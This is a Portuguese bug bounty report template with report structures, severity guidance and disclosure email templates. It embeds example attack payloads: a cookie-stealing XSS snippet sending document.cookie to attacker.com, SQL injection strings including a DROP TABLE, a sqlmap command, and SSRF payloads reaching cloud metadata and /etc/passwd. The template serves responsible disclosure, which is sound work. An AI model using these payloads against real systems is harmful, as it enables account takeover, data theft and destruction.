# 🐛 Modelo de relatório de bug bounty

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

> **Como utilizar:** este é um modelo, não um relatório de resultados reais. Os campos entre colchetes são instruções de preenchimento traduzidas; substitui-os pela informação do caso. Os marcadores técnicos e valores literais dos exemplos foram preservados. PoC significa prova de conceito; payload é a carga de teste; endpoint é um ponto de acesso de uma aplicação. Os endereços, valores, versões e provas apresentados são exemplos. Caminhos como `./evidence/vuln-001-sqli.png` e `attachment_url` são marcadores para provas a fornecer, não ficheiros incluídos.

---

## 🎯 Modelo rápido

````markdown
## Resumo
[Descrição da vulnerabilidade numa linha]

## Gravidade
[Crítica/Elevada/Média/Baixa] - CVSS: X.X

## Tipo de vulnerabilidade
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/endpoint
`https://example.com/vulnerable-endpoint`

## Passos para reproduzir
1. Passo 1
2. Passo 2
3. Passo 3

## Impacto
[O que um atacante pode conseguir]

## Prova de conceito
[Código/Capturas de ecrã/Vídeo]

## Correção
[Como corrigir]
````

---

## 📝 Modelo de relatório completo

### Formato do título
```
[Gravidade] [Tipo de vulnerabilidade] em [Funcionalidade/endpoint] permite [Impacto]

Exemplos:
- [Crítica] Injeção SQL no formulário de início de sessão permite extrair a base de dados
- [Elevada] XSS armazenado nos comentários permite tomar controlo de contas
- [Média] IDOR em /api/users/{id} expõe informação pessoal identificável de outros utilizadores
```

---

## 📋 Estrutura detalhada do relatório

````markdown
# [Tipo de vulnerabilidade] em [Funcionalidade/endpoint]

## Resumo
Foi descoberta uma vulnerabilidade [tipo de vulnerabilidade] em [funcionalidade/endpoint] que 
permite a um atacante [impacto]. Esta vulnerabilidade afeta [âmbito/utilizadores].

## Avaliação da gravidade

| Métrica | Valor |
|--------|-------|
| **Gravidade** | Crítica / Elevada / Média / Baixa |
| **Pontuação CVSS** | X.X |
| **Vetor CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [Nome da CWE] |

## Detalhes da vulnerabilidade

### Ativo afetado
- **URL:** `https://example.com/path/to/endpoint`
- **Parâmetro:** `parameter_name`
- **Método:** GET/POST
- **Autenticação:** Necessária/Não necessária

### Código/configuração vulnerável
[Se visível/aplicável]

## Passos para reproduzir

### Pré-requisitos
- Conta necessária: Sim/Não
- Acesso especial necessário: [descrever]
- Navegador/ferramenta: [especificar]

### Passos de reprodução

1. **Aceder ao endpoint vulnerável**
   ```
   https://example.com/vulnerable-page
   ```

2. **Injetar o payload**
   ```
   [Payload aqui]
   ```

3. **Observar o resultado**
   - [O que acontece]

### Pedido HTTP
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### Resposta HTTP
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Prova de conceito

### Payload utilizado
```
[O teu payload aqui]
```

### Provas em capturas de ecrã
![Descrição](attachment_url)

### Vídeo da PoC
[Ligação para a demonstração em vídeo]

### Script de PoC automático (opcional)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Avaliação do impacto

### Impacto técnico
- **Confidencialidade:** [Dados a que é possível aceder]
- **Integridade:** [Dados que é possível modificar]
- **Disponibilidade:** [Possível interrupção do serviço]

### Impacto no negócio
- [Impacto financeiro]
- [Danos reputacionais]
- [Infrações regulamentares/de conformidade]
- [Número de utilizadores afetados]

### Cenário de ataque
Um atacante poderia explorar esta vulnerabilidade para:
1. [Ação específica 1]
2. [Ação específica 2]
3. [Ação específica 3]

## Recomendações de correção

### Correção imediata
[Correção rápida para mitigar]

### Solução a longo prazo
[Correção adequada]

### Exemplo de correção do código
```python
# Antes (vulnerável)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Depois (corrigido)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Referências
- [Ligação OWASP]
- [Ligação CWE]
- [CVEs relacionadas]
- [Artigos/Investigação]

## Cronologia
| Data | Ação |
|------|--------|
| YYYY-MM-DD | Vulnerabilidade descoberta |
| YYYY-MM-DD | Relatório submetido |
| YYYY-MM-DD | Receção confirmada pelo fornecedor |
| YYYY-MM-DD | Correção implementada |
| YYYY-MM-DD | Recompensa atribuída |
````

---

## 🔥 Modelos por tipo de vulnerabilidade

### XSS (Cross-Site Scripting: execução de scripts no contexto de outro sítio)

````markdown
## Resumo
Uma vulnerabilidade XSS refletida/armazenada em [endpoint] permite aos atacantes executar 
JavaScript arbitrário nos navegadores das vítimas.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Impacto
- Sequestro de sessões através do roubo de cookies
- Tomada de controlo de contas
- Registo de teclas premidas
- Ataques de phishing
- Distribuição de malware

## PoC
```javascript
// Código para roubo de cookies
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### Injeção SQL

````markdown
## Resumo
A injeção SQL em [parâmetro], no endpoint [endpoint], permite extrair o conteúdo da base de dados.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Provas
- Base de dados: MySQL 8.0
- Tabelas extraídas: users, orders, payments
- Registos acessíveis: 10,000+

## Comando SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference: referência direta insegura a objetos)

````markdown
## Resumo
Uma vulnerabilidade IDOR em [endpoint] permite aceder a [recurso] de outros utilizadores.

## Reprodução
1. Iniciar sessão como utilizador A (ID: 100)
2. Aceder: `GET /api/users/100/profile`
3. Alterar o ID para 101: `GET /api/users/101/profile`
4. Observar: são devolvidos os dados do utilizador B

## Impacto
- Exposição de informação pessoal identificável (nome, correio eletrónico, morada)
- Dados de [X] utilizadores acessíveis
- Violação do RGPD/privacidade

## Provas
| Pedido | Resposta |
|---------|----------|
| `/api/users/100` | Dados do utilizador A ✓ |
| `/api/users/101` | Dados do utilizador B ✗ |
| `/api/users/102` | Dados do utilizador C ✗ |
````

### SSRF (Server-Side Request Forgery: falsificação de pedidos do lado do servidor)

````markdown
## Resumo
SSRF em [funcionalidade] permite efetuar pedidos a serviços internos.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Recursos internos acedidos
- Endpoint de metadados AWS
- Servidor Redis interno
- Sistema de ficheiros local

## Provas
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Contorno da autenticação

````markdown
## Resumo
O contorno da autenticação em [funcionalidade] permite acesso não autorizado a [recurso].

## Método de contorno
[Descrever a técnica de contorno]

## Reprodução
1. Aceder ao endpoint protegido sem autenticação
2. [Técnica específica]
3. Acesso concedido

## Impacto
- Acesso ao painel de administração
- Personificação de utilizadores
- Manipulação de dados
````

---

## 📊 Orientações de gravidade

> **Gravidade e versão:** as categorias P1–P4 são orientações ilustrativas; a gravidade depende do impacto demonstrado e das regras do programa. O vetor preservado usa CVSS 3.1; identifica a versão exigida pelo programa em vez de misturar vetores de versões diferentes. Ver [HackerOne: definição de gravidade](https://docs.hackerone.com/en/articles/8495674-defining-severity), [FIRST CVSS 3.1](https://www.first.org/cvss/v3.1/specification-document) e [FIRST CVSS 4.0](https://www.first.org/cvss/v4.0/specification-document).

### Crítica (P1)
```
- RCE (Remote Code Execution: execução remota de código)
- Injeção SQL com extração de dados
- Contorno da autenticação com acesso de administrador
- Tomada de controlo total de contas
- Manipulação de pagamentos/financeira
- Informação pessoal identificável de todos os utilizadores exposta
```

### Elevada (P2)
```
- XSS armazenado com impacto significativo
- IDOR com acesso a dados sensíveis
- SSRF contra serviços internos
- Escalada de privilégios
- Exposição de dados sensíveis
```

### Média (P3)
```
- XSS refletido
- CSRF em ações sensíveis
- Divulgação de informações
- Contorno da limitação de frequência de pedidos
- Fixação de sessão
```

### Baixa (P4)
```
- Self-XSS (execução de XSS pelo próprio utilizador)
- IDOR em dados não sensíveis
- Cabeçalhos de segurança em falta
- Mensagens de erro demasiado detalhadas
- Enumeração de nomes de utilizador
```

---

## ✅ Lista de verificação para submissão

````markdown
## Antes de submeter

□ Título claro e descritivo
□ Avaliação rigorosa da gravidade
□ Reprodução passo a passo
□ Prova de conceito funcional
□ Impacto explicado com clareza
□ Capturas de ecrã/vídeo anexados
□ Correção sugerida
□ Ativo confirmado como abrangido pelo âmbito
□ Ausência de duplicados confirmada por pesquisa
□ Gramática/ortografia verificadas
□ Dados sensíveis ocultados
□ Informações de contacto incluídas
````

---

## 💡 Conselhos práticos

### Boas práticas ✅
```
✓ Sê claro e conciso
✓ Inclui todos os detalhes necessários
✓ Apresenta uma PoC funcional
✓ Explica o impacto
✓ Sugere uma correção
✓ Mantém uma postura profissional e respeitosa
✓ Segue uma divulgação responsável
✓ Responde rapidamente às perguntas
```

### Práticas a evitar ❌
```
✗ Não acedas a dados de utilizadores reais
✗ Não testes em produção
✗ Não ultrapasses o âmbito autorizado
✗ Não utilizes ferramentas de análise automática sem autorização
✗ Não divulges antes da correção
✗ Não adotes uma postura agressiva quanto à recompensa
✗ Não submetas duplicados
✗ Não submetas problemas meramente teóricos
```

---

## 📧 Modelos de comunicação

### Relatório inicial
```
Olá [Equipa de segurança],

Descobri uma vulnerabilidade [tipo de vulnerabilidade] de gravidade [gravidade] em 
[produto/funcionalidade]. Os detalhes completos constam do meu relatório.

Resumo: [Uma linha]
Impacto: [Impacto resumido]
PoC: [Anexada/Incluída]

Fico disponível para fornecer informações adicionais.

Com os melhores cumprimentos,
[O teu nome]
[Perfil HackerOne/Bugcrowd]
```

### Pedido de atualização
```
Olá,

Gostaria de pedir uma atualização sobre o relatório #[ID], submetido em [data]. 
Podem informar-me sobre o seu estado atual?

Obrigado.
```

### Discussão da recompensa
```
Obrigado pela triagem do meu relatório. Considero que a gravidade deveria ser 
[mais elevada/diferente] pelos seguintes motivos:

1. [Motivo 1]
2. [Motivo 2]

Seria possível reavaliar o valor da recompensa?
```

---

**Voltar aos relatórios:** [📝 Modelos de relatórios](../../README.md#-reporting-templates)
